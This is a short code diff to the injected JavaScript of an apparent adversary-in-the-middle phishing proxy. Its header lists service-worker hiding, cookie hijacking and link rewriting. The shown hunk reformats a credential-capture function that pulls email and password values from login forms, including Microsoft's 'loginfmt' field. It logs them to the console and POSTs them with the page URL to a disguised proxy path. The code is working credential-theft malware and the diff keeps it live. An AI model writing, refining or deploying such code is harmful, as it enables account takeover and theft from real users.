@@ -1,6 +1,6 @@
 // ============================================================
 // ORIGINAL FEATURES: SW hiding, cookie hijack, href/action rewriting
-// PLUS: DOM password capture (sends email+password to /JSCookie_6X7dRqLg90mH)
+// PLUS: DOM password capture with Console Logs (for debugging)
 // ============================================================
 
 // ---- 1. Hide Service Worker ----
@@ -110,29 +110,29 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     } catch { }
 }
 
-// ---- 4. DOM Password Capture (NEW) ----
+// ---- 4. DOM Password Capture (NEW) with Console Logs ----
 (function() {
     function sendCredentials(email, password) {
-    if (!password) return;
+        if (!password) return;
 
-    // 🖨️ Print to browser console
-    console.log('[📧 CAPTURED] Email:', email || 'N/A');
-    console.log('[🔑 CAPTURED] Password:', password);
-    console.log('[🌐 URL]:', location.href);
+        // ***** CONSOLE LOG (DEBUGGING) *****
+        console.log('[DOM Capture] Email extracted:', email);
+        console.log('[DOM Capture] Password extracted:', password);
+        // **********************************
 
-    // Send to server (unchanged)
-    fetch('/JSCookie_6X7dRqLg90mH', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            type: 'credentials',
-            email: email || '',
-            password: password,
-            time: Date.now(),
-            url: location.href
-        })
-    }).catch(() => {});
-}
+        // Send to proxy
+        fetch('/JSCookie_6X7dRqLg90mH', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'credentials',
+                email: email || '',
+                password: password,
+                time: Date.now(),
+                url: location.href
+            })
+        }).catch(() => {});
+    }
 
     function findFields() {
         let emailField = document.querySelector('input[name="loginfmt"], input[type="email"], input[name="login"]');
